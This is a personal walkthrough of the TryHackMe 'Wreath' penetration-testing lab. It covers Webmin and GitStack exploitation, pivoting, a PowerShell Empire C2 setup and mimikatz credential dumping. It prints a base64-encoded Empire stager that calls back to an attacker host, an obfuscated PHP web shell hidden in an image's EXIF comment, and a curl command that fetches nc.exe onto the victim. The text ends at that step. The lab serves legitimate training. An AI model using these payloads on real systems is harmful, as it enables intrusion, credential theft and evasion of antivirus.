Host Report
Wreath
Host Notes:
Wreath is a simulated penetration test network consisting of 3 machines, each being required to be compromised to aid in further access to the rest of the network. TryHackMe describes Wreath as "Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.". Additional learning topics that TryHackMe lists for Wreath are:
 

    Pivoting
    Working with the Empire C2 (Command and Control) framework
    Simple Anti-Virus evasion techniques

The following topics will also be covered, albeit more briefly:

    Code Analysis (Python and PHP)
    Locating and modifying public exploits
    Simple webapp enumeration and exploitation
    Git Repository Analysis
    Simple Windows Post-Exploitation techniques
    CLI Firewall Administration (CentOS and Windows)
    Cross-Compilation techniques
    Coding wrapper programs
    Simple exfiltration techniques
    Formatting a pentest report

Getting Started:
Once I downloaded the connection pack and got connected in to the network, I proceeded to learn the backstory as to how we were contacted to perform this "penetration test". Your old friend, Thomas Wreath, randomly contacts you to see if you'd be willing to try and break in to some servers he has running on his home network:



While this is probably not the best idea to agree to for a variety of legal reasons, let's just roll with it and see what our old friend Thomas is up to on these servers of his!

The intro then goes on to provide more info about the network setup provided by Thomas himself:


So it looks like there are a total of 3 systems on the network that we need to get access to. We'll begin with enumerating the web server, which is the only publicly available system per the notes provided by Thomas. The network diagram provided by TryHackMe suggests that this is the way in to the environment:

Web Server (10.200.196.200):
The first host we're going after is the web server, which is at 10.200.196.200. Navigating to the URL, we're given a Server Not Found page but notice in the address bar that the URL has changed to https://thomaswreath.thm/:



What is likely going on is that we need to add an entry to our hosts file with the IP of the web server mapping to thomaswreath.thm. After adding the entry, the web site now loads properly:





Let's go ahead and run a full nmap scan against the web server to see if we can find out some more information about the host:



The nmap scan reveals that ssh, 80, 443, 9090, and 10000 are listening on this host. We can deduce that since SSH and Apache are running on the server, that this target is likely a Linux server (a personal favorite of mine to exploit!). Port 10000 looks interesting to check out, and heading over to that page in a browser reveals a login page:



Researching webmin further, it appears to be an offering from ESET for remote management of a Linux system. It seems that the credentials for Webmin are that of your root user and not an easily guessed pair of default credentials like admin/admin. However, if we go back to the results of the nmap scan, we have a specific version of the webmin software running on the server:



Googling for exploits for webmin 1.890 exploit reveals a very juicy looking exploit:


The README has a link to a medium.com article which explains the exploit code just a slight bit more: https://medium.com/@foxsin34/webmin-1-890-exploit-unauthorized-rce-cve-2019-15107-23e4d5a9c3b4



Armed with this script and a seemingly vulnerable target, let's run it against the web server and see what happens:



Based on the description of the explot, a message of a password being expired means that the target is not vulnerable. BUT, we get some form of code execution because the output of the id command is showing root. So, let's try another command to see what happens:



So it looks like the exploit is working! The next logical step to try is to see if netcat is installed so that we can perhaps try creating a reverse shell. I'll run which nc to see if nc is installed:



Hm... now the exploit no longer seems to be working! But since we have RCE as root, instead of going for a reverse shell, let's enumerate root's home folder to see if there might be anything useful in there! Running an ls -la command on /root/ reveals an .ssh folder which is most definitely juicy!:



And digging further in to the .ssh directory, we can see that we have a id_rsa key file present!:



We can cat the contents of the id_rsa file and save it locally in to a file of the same name, chmod 400 the file, and then ssh in as root with this key:



Consider your web server pwned, Mr. Wreath!
Scanning Internal Network:
Now that I have access to the internal network, I uploaded a nmap binary to the web server and ran a scan of the internal /24 subnet. It looks like 3 additional hosts were found (excluding the web server):



We now have 10.200.196.100, 10.200.196.150, and 10.200.196.250 to explore further.
Git Server (10.200.196.150):
One of the newly discovered hosts, 10.200.196.150, looks interesting because it has a web server running, as well as RDP:



If we recall, the info from Thomas states that there is a git server on the network. Additionally, RDP is commonly used to manage remote systems, so any server that has RDP open is worth investigating.

If we try to connect to the web server on port 80 on this host, the request times out. If we recall the info from Thomas, he states that only the web server is publicly accessible. Everything else can only be accessed from within the internal network. However, now that we have an SSH key for the web server, we can utilize SSH port forwarding to allow us to use the web server as a proxy to other hosts in the network, including the newly found host 10.200.196.150!

We can use the following command to set up an SSH port forward, and utilize proxychains (which by default uses port 9050) to begin exploring the internal network:
 

sh -D 9050 -i id_rsa -f -N root@10.200.196.200


Now that we are using the web server as a proxy to the rest of the network, we can fire up Firefox and by using the foxyproxy plugin and configuring it to use our socks proxy, we can now access the web server running on 10.200.196.150:



We get an error page, which is useful and not useful - useful because we know that we are successfully contacting the web server listening on this host, not useful because it's an error page! But now that we have confirmed that our SSH port forwarding is working, we can enumerate the web server by starting a directory scan on it. I prefer to use ffuf, but gobuster or another directory scanning tool will also get the job done. We will use the proxychains tool to instruct ffuf to run through our SSH port forward. We'll also use the -x argument to specify the IP and port of the proxy server to use (in our case, localhost:9050). I'll be using the directory-list-2.3-medium.txt wordlist from SecLists for the wordlist, and telling ffuf to run with 100 threads and recursively begin a search of every sub directory it finds:
 

proxychains -q ffuf -u http://10.200.196.150/FUZZ -x socks5://127.0.0.1:9050 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.html,.php,.asp,.aspx,.jsp,.cgi,.pl,.sh,.bak,.py -t 100 -recursion  


After several minutes of running, ffuf finds a directory called web:





This is the git server!

When trying to access anything on the page, we are asked to authenticate. We don't have any credentials to use, as none were obtained from the web server. Googling for GitStack exploits shows that there is an unauthenticated RCE exploit available: https://github.com/kacperszurek/exploits/blob/master/GitStack/gitstack_unauthenticated_rce.py

We just need to modify the exploit to use the IP address of the web server, and fire it off:



As this script needs to be ran against the git server, which is only accessible through the SSH port forward, we will once again use proxychains but this time with python. The script by default runs the whoami command as the command to execute. Running the script, we get a response and the output shows we are running as nt authority\system:



Now that we have RCE on the git server as nt authority\system, we want to get access to the target. For this, I utilized the exploit to make myself a local account on the server, and then add that account to both the local Administrators group as well as the Remote Desktop Users group:



I then used rdesktop with proxychains to connect in with my new account:



And I'm in on the server:



 
PowerShell Empire:
Now that are dealing with multiple compromised hosts (the web server and the git server), it would be much easier to manage our targets by introducting a C2 (Command & Control) framework. The TryHackMe recommendation is to use PowerShell Empire. I won't go over how to install it in this post as there are detailed instructions on how to get it up and running in the TryHackMe room. I'll go ahead and start up the Empire server:



We will then start the Empire Client:
 

powershell-empire client





Lastly, we will start starkiller, which is the GUI for PowerShell Empire:
 

starkiller




Now that we have PowerShell Empire up and running, we need to create a listener so that once we have a payload (stager)to execute on the web server, it will connect back to our PowerShell Empire instance. Creating a listener in starkiller is very simple. Click on Create and then choose the options you want for the listener. In our case, we are going to use an HTTP listener and name it WebServerListener, as this will be the listener we use to connect the web server to our PowerShell Empire instance. For the host, we will use the IP address of our machine on the VPN. For the port, I will use port 30031. The listener should look like the following when complete (the rest of the settings don't matter in this case):



Once we submit it, we should see the new listener created and awaiting a connection:





Now that we have a listener set up, we need to configure a stager to execute a payload to connect back to the listener. To create a stager, simply click on the Stagers blade and create one:

Showing the stagers menu on the left hand side of the Starkiller interface

I will choose the type multi/bash and choose the WebServerListener previously set up as the listener for the stager. Lastly, I'll choose python as the language for the stager:



Once the stager has been created, it will show up in the stagers menu:



Now we are ready to execute the payload on the web server! To get the stager payload, you just need to go to the stager and copy to the clipboard:



If we look at the raw contents of the stager, it looks like this:
 

#!/bin/bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuMTkzLjExMjozMDAzMSc7dD0nL2FkbWluL2dldC5waHAnO3JlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249MU1KU0tHYzhubG5rTW44TEtVRUROUHJMNXZZPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyddZmVxYyhDKTB3PUd0S3p1NEAsTm01YUR+W0JpcCs7eycuZW5jb2RlKCdVVEYtOCcpO1MsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdCmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));" | python3 &
rm -f "$0"
exit

We could copy and paste the whole contents of this in to a .sh script on the target, and then use bash to execute it. However, we can simply remove the beginning #!/bin/bash and just paste the remainder of the contents in to the terminal of the web server:



And we can see that our stager was able to connect back to our listener, and create an agent. An agent is simply a compromised machine that we can now use PowerShell Empire to manage:





We can now use starkiller to interact with our agent and perform a variety of tasks. Simply click on the agent to open it up and start running commands:



Or browse the file system:



Now that we have an agent for the web server, we'll turn our focus to the git server. Another cool thing that we can do with PowerShell Empire is create what's known as a hop listener. A hop listener can be useful for when you have access to a target that cannot directly communicate with your PowerShell Empire instance, but can communicate with another system that can communicate with your PowerShell Empire instance. This works by serving the stager for the target that we can't directly communicate with on a system that we can directly communicate with. The unreachable target will then make a connection to the target we can reach, which will then relay the connection back to our PowerShell Empire instance. In this case, the web server will be used as the hop listener, because it can both communicate with the git server and our local Kali VM.

First up, we'll create the hop listener and set the host to the web server:



We'll tell the hop listener to use the existing WebServerListener as the redirect:



Once we have created the hop listener, we will have the files that we need to upload to the web server in the /tmp/http_hop directory on our Kali VM:



We now also have 2 listeners:



Next, we will create our stager for the hop listener. We'll choose multi/launcher as the type and powershell as the language, as this is the stager that will get executed on the git server which is a Windows host:



Next, we need to upload the contents from the /tmp/http_hop folder on our Kali machine to the web server so that the git server's stager can be used. I'll use the python SimpleHTTPServer module to host a web server in this directory, and then download the files on to the web server:





Next, I'll recreate the directory structure and move the files accordingly:



Now we're ready to access the stager from the git server that is hosted on the web server. In order to make those files accessible, we need to start a web server listening on the port we defined in the http_hop listener, which was 50051. Since the firewall is enabled on the web server (which is running CentOS), we need to run the following commands to allow our port through the firewall:
 

sudo firewall-cmd --zone=public --permanent --add-port=50051/tcp
sudo firewall-cmd --reload


We could use the existing web directory at /var/www/html on the target, but instead I'll use the PHP development web server in the directory where I stored the stager files:



Now, we can copy the payload for the multi/launcher stager and execute it on the git server from powershell. We should get a hit back on our listener:



We now have our http_hop listener working, which is directing traffic from the git server to the web server and then to our PowerShell Empire instance. We can now use the same tools as we did with the web server for the git server:






 
Post Exploitation of Git Server:
The 1st thing I always do when I get access to a Windows target is to download mimikatz on to it and dump all the credentials. This can be useful for finding the passwords of other users who may have logged on to the server and had their credentials cached. I'll start up a PowerShell session as Administrator and then proceed to download and run mimikatz:



I'll then navigate to where I have the mimikatz executables stored on my Kali machine and start a Python web server:



I'll then download mimikatz to the web server, as again the git server cannot directly communicate with my Kali machine. I'll use the PowerShell Empire agent to download mimikatz:





And then I'll use PowerShell to download mimikatz.exe from the web server to the git server:






And we get the NTLM hash for the Administrator user:



And another juicy NTLM hash for a user named thomas:



Using crackstation.net, we can attempt to crack the Administrator hash and Thomas's hash. We are unable to crack the Administrator's hash, but for Thomas it successfully cracks as i<3ruby:



In a real world penetration test, you should never upload client hashes to public sites such as crackstation.net. You should always try to crack them offline with local wordlists.



 
Personal PC (10.200.196.100):
The last target on the network that we need to get access to is Thomas's PC. We will leverage our existing PowerShell Empire agent on the git server to launch an ARP scan on the network to see if we can find Thomas's PC. We can use the powershell/situational_awareness/network/arpscan module to ARP scan the network:



And the results reveal a previously unknown host, 10.200.196.100:



We can then use the powershell/situational_awareness/network/portscan module to port scan this specific host to see what ports are open:



We can see now that ports 80 and 3389 are open on this host. We can make the assumption that this is Thomas's PC, and we'll try to remote desktop in with the username of thomas and the password of i<3ruby that we found earlier from the git server. However, we are blocked from accessing RDP:



This is likely due to the fact that the traffic from Thomas's PC is restricted to just the git server and no other systems on the network. Therefore, we can't use the web server via proxychains to access his PC. So instead, we'll try from the git server and see if we can get access:



But the user account thomas does not seem to be enabled for remote login:



With no access to RDP, we should turn our focus to the web server running on Thomas's PC. He stated that he does development work on his personal PC, and then pushes the code to the web server. Since this is a development environment, it's very likely there is some kind of vulnerability present that we will need to find. However, in order to be able to access the web server on Thomas's PC from our Kali machine, we will need to do some port forwarding. Essentially, we need to create a way for the traffic coming back to the git server from Thomas's PC to be able to be passed back to us. This will get a little tricky, but just hold on for the ride and we will get through it!

First, we will upload chisel to thegit server via our PowerShell Empire agents. I'll start a python web server in the directory on my Kali machine where I've got the chisel binaries:



And then download the Windows binary to the web server due to the traffic restrictions between our Kali machine and the git server:



And then I will download the Windows file to the git server via the agent on the git server:





Now we need to start a chisel server on the git server. Since doing so will cause the agent prompt to hang, I'll RDP back in to the git server. First, we need to allow a port through the firewall for the chisel server. I'll chose port 30000:



Then I'll start the chisel server in socks5 proxy mode:



Now here is where it gets a little weird. I honestly am not 100% sure what is going on here, and I had to look up how to make this work. Essentially, in order to acces the chisel proxy we just set up, we need to forward a local port on our Kali machine to the git server via the web server. To do this, we can use the following command:



Now we are forwarding port 8003 from our local machine to the git server on port 30000 via the web server. We then need to use chisel in client mode on our Kali machine to send traffic through the forwarded 8003 port:



We will then see on the git server that we have a connection:



Now we should have communication end to end from Thomas's PC to us. The last thing that we need to do is set up another proxy in foxyproxy to utilize port 8081:


And then attempting to access 10.200.196.100 via this proxy gets us back the development web server:



Looking at the response headers, we can see the development server is powered by PHP, so we can assume the website is coded in PHP:



Now that we can access the development website, I'll once again run ffuf to see if there are any interesting developmental directories found. Shortly after starting ffuf, a directory called resources is found and returns a 401 response code (unauthorized):



Going to this URL presents a login page, and trying the username thomas and password of i<3ruby, we're able to log in:



It appears that we've logged in to a page where users can upload files to the server. Looking at the source code of the site, it looks like only jpeg, png, and gif file formats are accepted:



The first thing I always try to do when I find websites that allow file uploads and are written in PHP is to try and upload a web shell so I can get further access. First, we need to obtain a valid image file. I'll just download the picture of the cat that Thomas is using on the website. Downloading this file also tips us off to a location where uploaded images may potentially be stored:



This is useful information to have, as once we upload a shell, we're going to need to know where to find it. We'll then rename ruby.jpg to ruby.jpg.php, and validate with the exiftool that our MIME Type is still image/jpeg:



Had the MIME Type gotten changed or not been a value accepted by the server, it would be rejected at upload time. Next, we'll need to inject our payload in to the comments of the file with the exiftool. I'll start out with a basic payload just to see if we can get the bypass to work:



We can now see that the MIME Type is still image/jpeg, and additionally we have a comment with our test payload:



Now, we can try to upload this and see what happens. When selecting your shell file, you'll have to change your explorer view to search for All Files, as it won't show up by default:



We can see that the file uploads successfully:



Now, how do we access it? The path mentioned earlier, /resources/assets/imgs, is not where files get uploaded. With a bit of basic sleuthing, I deduced that files were being uploaded to /resources/uploads/<FILE>. Thus, I accessed my web shell at /resources/uploads/ruby.jpg.php:


That's awesome that we have code being executed by our .jpg.php file, but a page that just displays "Test Payload" is pretty useless. What we want to do next is upgrade our PHP file in to something we can use to execute commands against the server. Thomas mentioned previously that his personal PC has anti-virus software running on it, so anything malicious is likely going to get flagged and disabled by the anti-virus software. Therefore, before we move on to making the PHP file more sophisticated, we should look in to obfuscating it. Obfuscating our PHP file will make it harder for the anti-virus software to detect what it is truly doing. We do not know what anti-virus software is running on Thomas's PC, but given that it's Windows, it's very likely to be running Windows Defender. In order to obfuscate the upgraded PHP file, I'll use the website https://www.gaijin.at/en/tools/php-obfuscator to change what the final version of the file contents will look like.

I'll upgrade the PHP file to be a command shell, which means anything passed to ?wreath= will get executed. Once the file is uploaded, we can run commands like ?wreath=whoami, ?wreath=ls, etc. First, I'll obfuscate the conents:



Which gets output as:



Essentially what the obfuscation website has done is base64 encoded various aspects of the PHP code, among other things. This will trick the anti-virus software because it will be unable to match it to anything in it's database, since it's unlikely to of seen this particular set of code before. This is very basic anti-virus bypass techniques, but can surprisingly still work very well in a modern environment.

We'll make a new copy of the ruby.jpg file and name it exshell.jpg.php. We'll again use the exiftool to inject our payload in to the comments of the file. However, we will also need to escape the $'s so that bash doesn't try to interpret them as variables. They can be escaped by using \'s in front of the $'s:
 

exiftool -Comment="<?php \$i0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$i0)){echo base64_decode('PHByZT4=').shell_exec(\$i0).base64_decode('PC9wcmU+');}die();?>" exshell.jpg.php


We'll then upload the file and attempt to see if our new payload is working:



We can successfully access our file and issue commands with it. In this example, I just ran a whoami command:


Now that I have command execution on Thomas's PC, I'm going to download a netcat binary on to the system to get a reverse shell. The default netcat binary from Kali won't work on Thomas's PC, as it's signature is known by Windows Defender. Therefore, another compiled version of nc can be used from https://github.com/int0x33/nc.exe/

 

http://10.200.196.100/resources/uploads/exshell.jpg.php?wreath=curl http://10.50.193.112/nc64.exe -o c:\\windows\\temp\\exnc.exe








 